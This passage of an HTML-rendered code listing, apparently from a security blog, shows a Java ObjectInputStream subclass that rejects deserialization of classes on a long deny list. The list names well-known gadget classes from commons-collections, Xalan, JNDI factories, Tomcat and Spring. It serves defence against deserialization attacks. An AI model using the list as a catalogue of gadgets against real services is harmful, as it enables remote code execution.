class="s">&#34;org.apache.activemq.spring.ActiveMQConnectionFactory&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.activemq.spring.ActiveMQXAConnectionFactory&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.axis2.jaxws.spi.handler.HandlerResolverImpl&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.axis2.transport.jms.JMSOutTransportInfo&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.bcel.internal.util.ClassLoader&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.catalina.authenticator.AuthenticatorBase&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.catalina.connector.Request&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.catalina.connector.RequestFacade&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.catalina.connector.Response&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.catalina.core.ApplicationFilterConfig&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.catalina.core.ApplicationServletRegistration&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.catalina.core.StandardContext&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.catalina.core.StandardService&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.catalina.core.StandardWrapperValue.invoke&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.catalina.deploy.FilterDef&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.catalina.deploy.FilterMap&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.catalina.loader.ParallelWebappClassLoader&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.catalina.loader.WebappClassLoaderBase&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.click.control.Column&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.click.control.Column$ColumnComparator&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.click.control.Table&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.commons.beanutils.BeanComparator&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.commons.codec.binary.Base64&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.commons.collections.Transformer&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.commons.collections.comparators.TransformingComparator&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.commons.collections.functors.ChainedTransformer&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.commons.collections.functors.ConstantTransformer&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.commons.collections.functors.InstantiateTransformer&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.commons.collections.functors.InvokerTransformer&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.commons.collections.functors.MapTransformer&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.commons.collections.keyvalue.TiedMapEntry&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.commons.collections.map.LazyMap&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.commons.collections.map.TransformedMap&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.commons.collections4.Transformer&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.commons.collections4.comparators.TransformingComparator&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.commons.collections4.functors.ChainedTransformer&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.commons.collections4.functors.ConstantTransformer&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.commons.collections4.functors.InstantiateTransformer&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.commons.collections4.functors.InvokerTransformer&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.commons.collections4.functors.MapTransformer&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.commons.collections4.keyvalue.TiedMapEntry&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.commons.collections4.map.LazyMap&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.commons.collections4.map.TransformedMap&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.commons.configuration.JNDIConfiguration&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.commons.configuration2.JNDIConfiguration&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.commons.dbcp.cpdsadapter.DriverAdapterCPDS&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.commons.dbcp.datasources.PerUserPoolDataSource&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.commons.dbcp.datasources.SharedPoolDataSource&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.commons.dbcp2.cpdsadapter.DriverAdapterCPDS&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.commons.dbcp2.datasources.PerUserPoolDataSource&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.commons.dbcp2.datasources.SharedPoolDataSource&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.commons.fileupload.disk.DiskFileItem&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.commons.io.FileUtils&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.commons.io.output.DeferredFileOutputStream&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.commons.io.output.ThresholdingOutputStream&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.commons.jelly.impl.Embedded&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.commons.proxy.provider.remoting.RmiProvider&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.coyote.AbstractProtocol;&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.coyote.ProtocolHandler&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.coyote.Request&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.coyote.Response&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.cxf.jaxrs.provider.XSLTJaxbProvider&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.ibatis.parsing.XPathParser&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.ignite.cache.jta.jndi.CacheJndiTmFactory&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.log4j.receivers.db.DriverManagerConnectionSource&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.log4j.receivers.db.JNDIConnectionSource&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.myfaces.context.servlet.FacesContextImpl&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.myfaces.context.servlet.FacesContextImplBase&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.myfaces.el.CompositeELResolver&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.myfaces.el.unified.FacesELContext&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.myfaces.view.facelets.el.ValueExpressionMethodExpression&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.openjpa.ee.JNDIManagedRuntime&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.openjpa.ee.RegistryManagedRuntime&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.openjpa.ee.WASRegistryManagedRuntime&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.shiro.codec.Base64&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.shiro.codec.CodecSupport&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.shiro.crypto.AesCipherService&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.shiro.io.DefaultSerializer&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.shiro.jndi.JndiObjectFactory&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.shiro.realm.jndi.JndiRealmFactory&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.shiro.util.ByteSource&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.tomcat.dbcp.dbcp.cpdsadapter.DriverAdapterCPDS&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.tomcat.dbcp.dbcp.datasources.PerUserPoolDataSource&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.tomcat.dbcp.dbcp.datasources.SharedPoolDataSource&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.tomcat.dbcp.dbcp2.BasicDataSourc&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.tomcat.dbcp.dbcp2.cpdsadapter.DriverAdapterCPDS&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.tomcat.dbcp.dbcp2.datasources.PerUserPoolDataSource&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.tomcat.dbcp.dbcp2.datasources.SharedPoolDataSource&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.tomcat.util.buf.ByteChunk&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.tomcat.util.descriptor.web.FilterDef&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.tomcat.util.descriptor.web.FilterMap&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.tomcat.util.modeler.BaseModelMBean&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.tomcat.util.modeler.Registry&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.wicket.util.file.Files&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.wicket.util.io.DeferredFileOutputStream&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.wicket.util.io.ThresholdingOutputStream&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.wicket.util.upload.DiskFileItem&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.xalan.lib.sql.JNDIConnectionPool&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.xalan.xslt.ObjectFactory&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.xalan.xslt.Process&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.xalan.xsltc.DOM&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.xalan.xsltc.TransletException&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.xalan.xsltc.runtime.AbstractTranslet&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.xalan.xsltc.trax.TemplatesImpl&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.xalan.xsltc.trax.TransformerFactoryImpl&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.xbean.propertyeditor.JndiConverter&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.xml.dtm.DTMAxisIterator&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.xml.serializer.SerializationHandler&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.arrah.framework.rdbms.UpdatableJdbcRowsetImpl&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.codehaus.groovy.runtime.ConvertedClosure&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.codehaus.groovy.runtime.MethodClosure&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.docx4j.org.apache.xalan.lib.sql.JNDIConnectionPool&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.hibernate.EntityMode&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.hibernate.engine.TypedValue&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.hibernate.engine.spi.TypedValue&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.hibernate.engine.spi.TypedValue$1&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.hibernate.jmx.StatisticsService&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.hibernate.property.BasicPropertyAccessor$BasicGetter&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.hibernate.property.Getter&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.hibernate.property.access.spi.Getter&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.hibernate.property.access.spi.GetterMethodImpl&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.hibernate.tuple.EntityModeToTuplizerMapping&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.hibernate.tuple.component.AbstractComponentTuplizer&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.hibernate.tuple.component.PojoComponentTuplizer&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.hibernate.tuple.entity.EntityEntityModeToTuplizerMapping&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.hibernate.type.AbstractType&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.hibernate.type.ComponentType&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.hibernate.type.Type&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.jboss.interceptor.builder.InterceptionModelBuilder&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.jboss.interceptor.builder.MethodReference&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.jboss.interceptor.proxy.DefaultInvocationContextFactory&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.jboss.interceptor.proxy.InterceptorMethodHandler&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.jboss.interceptor.reader.ClassMetadataInterceptorReference&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.jboss.interceptor.reader.DefaultMethodMetadata&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.jboss.interceptor.reader.ReflectiveClassMetadata&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.jboss.interceptor.reader.SimpleInterceptorMetadata&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.jboss.interceptor.spi.context.InvocationContextFactory&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.jboss.interceptor.spi.instance.InterceptorInstantiator&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.jboss.interceptor.spi.metadata.ClassMetadata&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.jboss.interceptor.spi.metadata.InterceptorReference&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.jboss.interceptor.spi.metadata.MethodMetadata&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.jboss.interceptor.spi.model.InterceptionModel&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.jboss.interceptor.spi.model.InterceptionType&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.jboss.remoting3.Channel&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.jboss.remoting3.Connection&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.jboss.remoting3.Endpoint&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.jboss.remoting3.OpenListener&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.jboss.remoting3.Remoting&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.jboss.remoting3.remote.HttpUpgradeConnectionProviderFactory&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.jboss.remoting3.spi.ConnectionHandler&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.jboss.remoting3.spi.ConnectionHandlerContext&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.jboss.remoting3.spi.ConnectionHandlerFactory&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.jboss.util.propertyeditor.DocumentEditor&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.jboss.weld.interceptor.builder.InterceptionModelBuilder&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.jboss.weld.interceptor.builder.MethodReference&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.jboss.weld.interceptor.proxy.DefaultInvocationContextFactory&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.jboss.weld.interceptor.proxy.InterceptorMethodHandler&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.jboss.weld.interceptor.reader.ClassMetadataInterceptorReference&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.jboss.weld.interceptor.reader.DefaultMethodMetadata&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.jboss.weld.interceptor.reader.ReflectiveClassMetadata&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.jboss.weld.interceptor.reader.SimpleInterceptorMetadata&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.jboss.weld.interceptor.spi.context.InvocationContextFactory&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.jboss.weld.interceptor.spi.instance.InterceptorInstantiator&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.jboss.weld.interceptor.spi.metadata.ClassMetadata&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.jboss.weld.interceptor.spi.metadata.InterceptorReference&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.jboss.weld.interceptor.spi.metadata.MethodMetadata&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.jboss.weld.interceptor.spi.model.InterceptionModel&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.jboss.weld.interceptor.spi.model.InterceptionType&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.jdom.Document&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.jdom.Element&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.jdom.input.SAXBuilder&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.jdom.transform.XSLTransformer&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.jdom2.transform.XSLTransformer&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.jsecurity.realm.jndi.JndiRealmFactory&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.mozilla.javascript.**&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.mozilla.javascript.Callable&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.mozilla.javascript.ClassCache&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.mozilla.javascript.Context&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.mozilla.javascript.IdScriptableObject&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.mozilla.javascript.MemberBox&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.mozilla.javascript.NativeError&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.mozilla.javascript.NativeJavaArray&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.mozilla.javascript.NativeJavaMethod&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.mozilla.javascript.NativeJavaObject&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.mozilla.javascript.NativeObject&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.mozilla.javascript.Scriptable&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.mozilla.javascript.ScriptableObject&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.mozilla.javascript.tools.shell.Environment&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.python.core.PyBytecode&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.python.core.PyFunction&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.python.core.PyObject&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.python.core.PyString&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.python.core.PyStringMap&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.quartz.utils.JNDIConnectionProvider&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.reflections.Reflections&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.slf4j.ext.EventData&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.springframework.aop.TargetSource&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.springframework.aop.config.MethodLocatingFactoryBean&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.springframework.aop.framework.AdvisedSupport&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.springframework.aop.framework.JdkDynamicAopProxy&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.springframework.aop.target.SingletonTargetSource&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.springframework.beans.factory.ObjectFactory&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.springframework.beans.factory.config.BeanReferenceFactoryBean&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.springframework.beans.factory.config.PropertyPathFactoryBean&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.springframework.core.SerializableTypeWrapper.$MethodInvokeTypeProvider&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.springframework.web.servlet.handler.HandlerInterceptorAdapter&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.springframework.web.servlet.support.RequestContextUtils&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.xnio.FutureResult&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.xnio.IoFuture&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.xnio.OptionMap&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.xnio.Options&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.xnio.Result&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.xnio.Xnio&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.xnio.XnioWorker&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.xnio.ssl.JsseXnioSsl&#34;</span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">SecurityObjectInputStream</span><span class="p">(</span><span class="n">InputStream</span><span class="w"> </span><span class="n">inputStream</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="w">        </span><span class="kd">super</span><span class="p">(</span><span class="n">inputStream</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w"> </span><span class="c1">// java.io.ObjectInputStream</span><span class="w">
</span></span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="w">    </span><span class="kd">protected</span><span class="w"> </span><span class="n">Class</span><span class="w"> </span><span class="nf">resolveClass</span><span class="p">(</span><span class="n">ObjectStreamClass</span><span class="w"> </span><span class="n">cls</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">contains</span><span class="p">(</span><span class="n">cls</span><span class="p">.</span><span class="na">getName</span><span class="p">()))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="kd">super</span><span class="p">.</span><span class="na">resolveClass</span><span class="p">(</span><span class="n">cls</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="w">        </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvalidClassException</span><span class="p">(</span><span class="s">&#34;Unexpected serialized class&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">cls</span><span class="p">.</span><span class="na">getName</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">contains</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">targetValue</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">forbiddenPackage</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">blacklist</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">targetValue</span><span class="p">.</span><span class="na">contains</span><span class="p">(</span><span class="n">forbiddenPackage</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln">30</span><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>Hook.json</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="s2">&#34;SerialHook&#34;</span><span class="err">:</span> <span class="p">{</span>
